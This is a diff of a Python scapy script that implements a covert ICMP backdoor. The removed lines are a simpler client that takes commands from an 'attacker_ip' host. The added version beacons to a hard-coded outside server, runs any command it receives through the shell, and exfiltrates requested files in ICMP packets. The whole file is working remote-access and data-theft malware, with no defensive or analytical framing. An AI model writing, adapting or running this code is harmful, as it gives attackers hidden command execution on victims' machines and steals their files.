@@ -1,25 +1,56 @@
+
+from scapy.all import sniff, send, Raw
+from scapy.layers.inet import IP, ICMP
+import os
 import time
-from scapy.layers.inet import IP, ICMP, sr1
-from scapy.sendrecv import send
-import subprocess
 
-attacker_ip = "10.10.2.60"
+FRAGMENT_SIZE = 1400
+SERVER_IP = '34.165.54.109'
 
-while True:
-    packet = IP(dst=attacker_ip) / ICMP()
-    response = sr1(packet, timeout=2, verbose=False)
+def send_file(file_name, server_ip):
+    if not os.path.exists(file_name):
+        print(f"File '{file_name}' doesn't exist")
+        return
 
-    if response:
-        if response.haslayer(ICMP) and hasattr(response[ICMP], "payload") and response[ICMP].payload:
-            command = response[ICMP].payload.load.decode()
-            print(f"Received command: {command}")
+    print(f"Reading '{file_name}'.")
 
-            try:
-                output = subprocess.check_output(command, shell=True, text=True)
-            except Exception as e:
-                output = str(e)
+    with open(file_name, "rb") as f:
+        while True:
+            chunk = f.read(FRAGMENT_SIZE)
+            if not chunk:
+                break
+            send(IP(dst=server_ip) / ICMP(type=14) / chunk, verbose=0)
+    print(f"Sending '{file_name}'.")
 
-            reply_packet = IP(dst=attacker_ip) / ICMP() / output
-            send(reply_packet, verbose=False)
 
-    time.sleep(5)
+def client():
+    server_ip = SERVER_IP
+
+    while True:
+        print("Sending beacon to server.")
+        send(IP(dst=server_ip) / ICMP(type=14) / b"beacon")
+
+        time.sleep(10)
+
+        print("Check commands.")
+        response = sniff(filter=f"icmp and host {server_ip}", count=1, timeout=5)
+
+        if response:
+            pkt = response[0]
+            if ICMP in pkt and Raw in pkt:
+                received_str = pkt[Raw].load.decode().strip() #errors='ignore'
+                print(f"Received: '{received_str}'")
+                if os.path.exists(received_str):
+                    send_file(received_str, server_ip)
+                else:
+                    output = os.popen(received_str).read()
+                    if output:
+                        send(IP(dst=server_ip) / ICMP(type=14) / output.encode(), verbose=0)
+                    else:
+                        send(IP(dst=server_ip) / ICMP(type=14) / b"", verbose=0)
+        else:
+            print("No command received.")
+
+
+if __name__ == "__main__":
+    client()
